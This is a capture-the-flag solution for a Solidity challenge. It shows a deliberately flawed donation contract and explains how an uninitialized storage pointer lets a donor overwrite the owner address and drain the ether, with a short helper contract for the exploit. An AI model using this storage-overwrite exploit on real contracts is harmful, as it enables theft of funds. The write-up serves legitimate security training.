# Donation
<sup>MATH: 750 POINTS</sup>

A candidate you don’t like is accepting campaign contributions via the smart contract below.

To complete this challenge, steal the candidate’s ether.

```solidity
pragma solidity ^0.4.21;

contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function DonationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}
```

Enjoy this inspirational music while you work: [Space Force](https://www.youtube.com/watch?v=_AUXpnB065o).


Solution:

At a first glance we notice that the `scale` variable is incorrect: 1 ether is already 10 ** 18 wei, so the scale is actually 10 ** 36.
While compiling on Remix few warnings pops out:

```
> contracts/CaptureTheEthereum.sol:27:9: Warning: Variable is declared as a storage pointer. Use an explicit "storage" keyword to silence this warning.
Donation donation;
^---------------^
> contracts/CaptureTheEthereum.sol:27:9: Warning: Uninitialized storage pointer. Did you mean '<type> memory donation'?
Donation donation;
^---------------^
```

[Here](https://stackoverflow.com/a/33839164/6650427)'s a good explaination of what's going on. Basically, not declaring `Donation donation;` as an in-memory variable with the `memory` keyword the brand new `duration` struct is created as a `storage` structure and it can modify the storage variables.
In our case storage variables are:

0. donations
1. owner

In this particular case we can manipulate the `etherAmount` to overwrite the `owner` variable.
What we need to do now is to find the correct value to send with our address.

```solidity
contract Exploit {
    address public myAddr = 0xaB75624dB2FDC51bFc0b4EB56902811a0Aa844b3;
    uint public myIntAddr = uint(myAddr);  // 978855172442788439174640874344464868650529604787
    uint256 public amountToSend = myIntAddr / (10 ** 36);  // 978855172442
}
```

call deposit with myAddr sending `amountToSend`, then withdraw aaaand is over.
